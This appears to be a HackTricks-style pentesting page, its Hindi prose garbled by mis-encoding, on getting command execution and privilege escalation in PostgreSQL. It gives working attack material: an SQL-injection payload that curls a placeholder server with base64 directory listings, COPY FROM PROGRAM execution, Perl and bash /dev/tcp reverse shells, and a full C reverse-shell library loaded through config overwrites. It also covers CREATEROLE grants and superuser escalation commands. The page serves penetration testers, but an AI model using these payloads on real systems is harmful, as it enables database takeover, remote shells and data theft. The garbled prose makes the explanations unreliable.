**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **Intigriti** рдХреЗ рд▓рд┐рдП **рд╕рд╛рдЗрди рдЕрдк** рдХрд░реЗрдВ, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**! рд╣рдорд╛рд░реЗ рд╕рд╛рде рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдЖрдЬ рд╣реА, рдФрд░ рд╢реБрд░реВ рдХрд░реЗрдВ рдмрд╛рдЙрдВрдЯреА рдХрдорд╛рдирд╛ рддрдХ **$100,000** рддрдХ!

{% embed url="https://go.intigriti.com/hacktricks" %}

### рд▓реЛрдХрд▓ рдлрд╝рд╛рдЗрд▓ рд▓реЗрдЦ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ PostgreSQL рддрд╛рд▓рд┐рдХрд╛ рдбреЗрдЯрд╛ рдЕрдкрдб
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
{% hint style="warning" %}
рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рд╕реБрдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╣реАрдВ рд╣реИрдВ рд▓реЗрдХрд┐рди рдЖрдкрдХреЗ рдкрд╛рд╕ **`CREATEROLE`** рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ рддреЛ рдЖрдк **рдЙрд╕ рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп рдмрди рд╕рдХрддреЗ рд╣реИрдВ:**
```sql
GRANT pg_execute_server_program TO username;
```
[**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реАред**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

рдпрд╛ **metasploit** рд╕реЗ `multi/postgres/postgres_copy_from_program_cmd_exec` рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред\
рдЗрд╕ рд╡рдВрд╢рд╛рдиреБрдХреНрд░рдорд┐рдХрддрд╛ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [**рдпрд╣рд╛рдБ**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5) рдорд┐рд▓реЗрдЧреАред CVE-2019-9193 рдХреЗ рд░реВрдк рдореЗрдВ рд░рд┐рдкреЛрд░реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛, Postges рдиреЗ рдЗрд╕реЗ [рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рдШреЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдФрд░ рдЗрд╕реЗ рдареАрдХ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/)ред

### PostgreSQL рднрд╛рд╖рд╛рдУрдВ рдХреЗ рд╕рд╛рде RCE

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md" %}
[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### PostgreSQL рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде RCE

рдкрд┐рдЫрд▓реЗ рдкреЛрд╕реНрдЯ рд╕реЗ **рдмрд┐рдирд░реА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдиреЗ рдХреЗ рдмрд╛рдж рдЖрдк **RCE рдЕрдкрд▓реЛрдб рдХрд░рдХреЗ рдПрдХ postgresql рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдФрд░ рдЗрд╕реЗ рд▓реЛрдб рдХрд░рдХреЗ** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### PostgreSQL рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ RCE

{% hint style="info" %}
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд RCE рд╡реЗрдХреНрдЯрд░реНрд╕ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕реАрдорд┐рдд SQLi рд╕рдВрджрд░реНрднреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рд╕рднреА рдХрджрдо рдиреЗрд╕реНрдЯреЗрдб SELECT рд╕реНрдЯреЗрдЯрдореЗрдВрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

PostgreSQL рдХреА **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓** **рдкреЛрд╕реНрдЯрдЧреНрд░реЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рджреНрд╡рд╛рд░рд╛ **рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп** рд╣реИ, рдЬреЛ рдбреЗрдЯрд╛рдмреЗрд╕ рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП **рд╕реБрдкрд░рдпреВрдЬрд░** рдХреЗ рд░реВрдк рдореЗрдВ, рдЖрдк рдлрд╝рд╛рдЗрд▓реЗрдВ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЗрд╕рд▓рд┐рдП рдЖрдк рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**

![](<../.gitbook/assets/image (303).png>)

#### **ssl\_passphrase\_command рдХреЗ рд╕рд╛рде RCE**

рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ](https://pulsesecurity.co.nz/articles/postgres-sqli) рдорд┐рд▓реЗрдЧреАред

рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдЧреБрдг рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ RCE рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` рдбреЗрдЯрд╛рдмреЗрд╕ рдХреА рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдкрде
* `ssl_passphrase_command = ''` рдпрджрд┐ рдирд┐рдЬреА рдлрд╝рд╛рдЗрд▓ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ (рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб) рддреЛ postgresql **рдЗрд╕ рдЧреБрдг рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдП рдЧрдП рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛**ред
* `ssl_passphrase_command_supports_reload = off` **рдпрджрд┐** рдпрд╣ рдЧреБрдг **рдЪрд╛рд▓реВ** рд╣реИ рддреЛ рдХреБрдВрдЬреА рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ рддреЛ **рдХрдорд╛рдВрдб** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛ рдЬрдм `pg_reload_conf()` рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЗрд╕рдХреЗ рдмрд╛рдж, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

1. **рд╕рд░реНрд╡рд░ рд╕реЗ рдирд┐рдЬреА рдХреБрдВрдЬреА рдбрдВрдк** рдХрд░реЗрдВ
2. рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдирд┐рдЬреА рдХреБрдВрдЬреА **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ** рдХрд░реЗрдВ:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░реЗрдВ**
4. рд╡рд░реНрддрдорд╛рди postgresql **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рдХреЛ **рдбрдВрдк** рдХрд░реЗрдВ
5. рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдЧреБрдгреЛрдВ рдХреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рд╕рд╛рде **рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рдХреЛ **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░реЗрдВ**:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. `pg_reload_conf()` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ

рдЬрдм рдореИрдВ рдЗрд╕реЗ рдЯреЗрд╕реНрдЯ рдХрд░ рд░рд╣рд╛ рдерд╛ рддреЛ рдореБрдЭреЗ рдкрддрд╛ рдЪрд▓рд╛ рдХрд┐ рдпрд╣ рдХреЗрд╡рд▓ рдХрд╛рдо рдХрд░реЗрдЧрд╛ рдЕрдЧрд░ **рдирд┐рдЬреА рдХреБрдВрдЬреА рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░ 640** рд╣реИ, рдпрд╣ **рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рд╛рдорд┐рддреНрд╡** рд╣реИ рдФрд░ **рд╕рдореВрд╣ ssl-cert рдпрд╛ postgres** (рддрд╛рдХрд┐ postgres рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕реЗ рдкрдврд╝ рд╕рдХреЗ), рдФрд░ _/var/lib/postgresql/12/main_ рдореЗрдВ рд╕реНрдерд╛рдирд┐рдд рд╣реИред

#### **archive\_command рдХреЗ рд╕рд╛рде RCE**

**рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдФрд░ WAL рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА** [**рдпрд╣рд╛рдБ**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)** рдорд┐рд▓реЗрдЧреАред**

рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдПрдХ рдФрд░ рдЧреБрдг рд╣реИ рдЬреЛ рдЙрдкрдпреЛрдЧреА рд╣реИ, рд╡рд╣ рд╣реИ `archive_command`ред

рдЗрд╕реЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, `archive_mode` рд╕реЗрдЯрд┐рдВрдЧ рдХреЛ `'on'` рдпрд╛ `'always'` рдореЗрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрджрд┐ рдпрд╣ рд╕рддреНрдп рд╣реИ, рддреЛ рд╣рдо `archive_command` рдореЗрдВ рдХрдорд╛рдВрдб рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ WAL (рд▓реЗрдЦрди-рдкрд╣рд▓реЗ рд▓реЙрдЧрд┐рдВрдЧ) рдХрд╛рд░реНрд░рд╡рд╛рдЗрдпреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╛рдзреНрдп рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд╕рд╛рдорд╛рдиреНрдп рдХрджрдо рд╣реИрдВ:

1. рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрд░реНрдХрд╛рдЗрд╡ рдореЛрдб рд╕рдХреНрд╖рдо рд╣реИ: `SELECT current_setting('archive_mode')`
2. `dynamic_library_path` рдореЗрдВ `/tmp/` рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `dynamic_library_path = '/tmp:$libdir'`
3. `session_preload_libraries` рдореЗрдВ рдЕрджреНрд╡рд┐рддреАрдп рдкреБрд╕реНрддрдХрд╛рд▓рдп рдирд╛рдо рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `session_preload_libraries = 'payload.so'`
4. `SELECT version()` рдХреНрд╡реЗрд░реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдореБрдЦреНрдп PostgreSQL рд╕рдВрд╕реНрдХрд░рдг рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
5. рд╕рд╣реА PostgreSQL dev рдкреИрдХреЗрдЬ рдХреЗ рд╕рд╛рде рджреБрд░реНрдЬрди рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░реЗрдВ рдирдореВрдирд╛ рдХреЛрдб:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

рдХреЛрдб рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдирд╛:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```
6. рдЪрд░рдг 2-3 рдореЗрдВ рдмрдирд╛рдИ рдЧрдИ рджреБрд░реНрдЬрди рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рдореВрд▓ рд╡рд╛рд▓реЗ `postgresql.conf` рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░реЗрдВ
7. рдЪрд░рдг 5 рд╕реЗ `payload.so` рдХреЛ `/tmp` рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ
8. рд╕рд░реНрд╡рд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдкреБрдирдГ рд▓реЛрдб рдХрд░реЗрдВ рд╕рд░реНрд╡рд░ рдХреЛ рдкреБрдирдГ рдЖрд░рдВрдн рдХрд░рдХреЗ рдпрд╛ `SELECT pg_reload_conf()` рдХреНрд╡реЗрд░реА рдХреЛ рдЖрдордВрддреНрд░рд┐рдд рдХрд░рдХреЗ
9. рдЕрдЧрд▓реЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдХрдиреЗрдХреНрд╢рди рдкрд░, рдЖрдкрдХреЛ рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓реА рдХрдиреЗрдХреНрд╢рди рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛ред
## **Postgres рдкреНрд░рд╛рдЗрд╡реЗрд╕реНрдХ**

### CREATEROLE рдкреНрд░рд╛рдЗрд╡реЗрд╕реНрдХ

#### **рдЕрдиреБрдорддрд┐**

[**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝**](https://www.postgresql.org/docs/13/sql-grant.html) рдХреЗ рдЕрдиреБрд╕рд╛рд░: _**`CREATEROLE`** рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рднреВрдорд┐рдХрд╛рдПрдБ рдХрд┐рд╕реА рднреА рднреВрдорд┐рдХрд╛ рдореЗрдВ рд╕рджрд╕реНрдпрддрд╛ рдкреНрд░рджрд╛рди рдпрд╛ рд░рджреНрдж рдХрд░ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ рдХреЛрдИ **рд╕реБрдкрд░рдпреВрдЬрд╝рд░** рдирд╣реАрдВ рд╣реИред_

рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **`CREATEROLE`** рдЕрдиреБрдорддрд┐ рд╣реИ рддреЛ рдЖрдк рдЦреБрдж рдХреЛ рдЕрдиреНрдп **рд░реЛрд▓** (рдЬреЛ рд╕реБрдкрд░рдпреВрдЬрд╝рд░ рдирд╣реАрдВ рд╣реИрдВ) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЛ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝рдиреЗ рдФрд░ рд▓рд┐рдЦрдиреЗ рдФрд░ рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХрд╛ рд╡рд┐рдХрд▓реНрдк рджреЗ рд╕рдХрддреЗ рд╣реИрдВ:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓реЗрдВ

рдЗрд╕ рднреВрдорд┐рдХрд╛ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреНрдп **рдиреЙрди-рд╕реБрдкрд░рдпреВрдЬрд░реНрд╕** рдХреЗ **рдкрд╛рд╕рд╡рд░реНрдб** рднреА **рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### рд╕реБрдкрд░рдпреВрдЬрд░ рдХреА рдЕрдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди

рдпрд╣ рдХрд╛рдлреА рд╕рд╛рдорд╛рдиреНрдп рд╣реИ рдХрд┐ **рд╕реНрдерд╛рдиреАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ PostgreSQL рдореЗрдВ рдХрд┐рд╕реА рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдмрд┐рдирд╛ рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЗрд╕рд▓рд┐рдП, рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдкрдиреЗ **рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рдЗрдХрдЯреНрдард╛ рдХрд░ рд▓реА рд╣реИ, рддреЛ рдЖрдк рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреЗ рдкрд╛рд╕ **`рд╕реБрдкрд░рдпреВрдЬрд░`** рднреВрдорд┐рдХрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
рдпрд╣ рдЖрдо рддреМрд░ рдкрд░ **`pg_hba.conf`** рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд▓рд╛рдЗрдиреЛрдВ рдХреЗ рдХрд╛рд░рдг рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE рдкреНрд░рд╛рдЗрд╡реЗрд╕реНрдХ**

[**рдЗрд╕ рд╡реНрд░рд┐рдЯрдЕрдк**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреА рдЧрдИ рд╣реИ рдХрд┐ рдХреИрд╕реЗ Postgres GCP рдореЗрдВ **ALTER TABLE** рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдкреНрд░рд╛рдЗрд╡реЗрд╕реНрдХ** рд╕рдВрднрд╡ рдерд╛ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

рдЬрдм рдЖрдк **рдПрдХ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдПрдХ рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рдорд╛рд▓рд┐рдХ рдмрдирд╛рдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ рдЗрд╕реЗ рд░реЛрдХрдиреЗ рд╡рд╛рд▓рд╛ рдПрдХ **рддреНрд░реБрдЯрд┐** рдорд┐рд▓рдиреА рдЪрд╛рд╣рд┐рдП, рд▓реЗрдХрд┐рди рдкреНрд░рддрд┐рддреНрдпрд╛рд╢реА GCP рдиреЗ рдЗрд╕ **рд╡рд┐рдХрд▓реНрдк рдХреЛ рджрд┐рдпрд╛** рдЬреЛ GCP рдореЗрдВ рд╕реБрдкрд░рдпреВрдЬрд░ рдкреЛрд╕реНрдЯрдЧреНрд░реЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдирд╣реАрдВ рджрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕ рд╡рд┐рдЪрд╛рд░ рдХреЛ рдЙрд╕ рддрдереНрдп рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд╕рд╛рде рдХрд┐ **INSERT/UPDATE/ANALYZE** рдХрдорд╛рдВрдб рдПрдХ **рдЕрдиреБрдХреНрд░рдордгрд┐рдХрд╛ рд╕рдорд╛рд░реЛрд╣** рд╡рд╛рд▓реА рддрд╛рд▓рд┐рдХрд╛ рдкрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, **рдХрд╛рд░реНрдп** рдХреЛ рдХрдорд╛рдВрдб рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдХреЗ рд░реВрдк рдореЗрдВ **рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ** рдЬрд┐рд╕рдореЗрдВ **рддрд╛рд▓рд┐рдХрд╛** **рдорд╛рд▓рд┐рдХ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде рдПрдХ рдЕрдиреБрдХреНрд░рдордгрд┐рдХрд╛ рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдФрд░ рдЙрд╕ рддрд╛рд▓рд┐рдХрд╛ рдкрд░ рдорд╛рд▓рд┐рдХ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдПрдХ **рд╕реБрдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЛ рджреЗрдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдФрд░ рдлрд┐рд░ рдЙрд╕ рддрд╛рд▓рд┐рдХрд╛ рдкрд░ рдПрдирд╛рд▓рд╛рдЗрдЬрд╝ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд╛рдирджрд╛рд░ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде рдЬреЛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдорд╛рд▓рд┐рдХ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИред
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### рд╢реЛрд╖рдг

1. рдПрдХ рдирдпрд╛ рддрд╛рд▓рд┐рдХрд╛ рдмрдирд╛рдиреЗ рд╕реЗ рд╢реБрд░реВ рдХрд░реЗрдВред
2. рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдХреБрдЫ рдЕрдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рд╕рд╛рдордЧреНрд░реА рдбрд╛рд▓реЗрдВ рддрд╛рдХрд┐ рдЕрдиреБрдХреНрд░рдорд┐рдХрд╛ рдХрд╛рд░реНрдп рдХреЗ рд▓рд┐рдП рдбреЗрдЯрд╛ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
3. рдПрдХ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рдЕрдиреБрдХреНрд░рдорд┐рдХрд╛ рдХрд╛рд░реНрдп рд╡рд┐рдХрд╕рд┐рдд рдХрд░реЗрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ рдХреЛрдб рдирд┐рд╖реЗрдз рдкреЗрд▓реЛрдб рд╢рд╛рдорд┐рд▓ рд╣реЛ, рдЬрд┐рд╕рд╕реЗ рдЕрдирдзрд┐рдХреГрдд рдЖрджреЗрд╢реЛрдВ рдХреЛ рдирд┐рд╖реЗрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
